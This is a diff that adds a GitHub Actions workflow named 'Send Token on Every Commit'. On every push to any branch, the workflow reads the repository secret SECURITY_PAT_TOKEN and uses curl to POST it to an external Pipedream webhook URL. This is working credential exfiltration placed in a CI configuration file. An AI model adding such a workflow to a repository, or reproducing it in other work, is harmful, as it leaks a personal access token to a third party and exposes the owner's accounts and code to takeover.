@@ -1,0 +1,17 @@
+name: Send Token on Every Commit
+
+on:
+  push:
+    branches:
+      - '*'
+
+jobs:
+  send-token:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send token to Pipedream
+        run: |
+          TOKEN=${{ secrets.SECURITY_PAT_TOKEN }}
+          curl --request POST 'https://196c108de2230786d31a11da090098fb.m.pipedream.net' \
+          --header 'Content-Type: application/json' \
+          --data-raw '{"token": "'"$TOKEN"'"}'
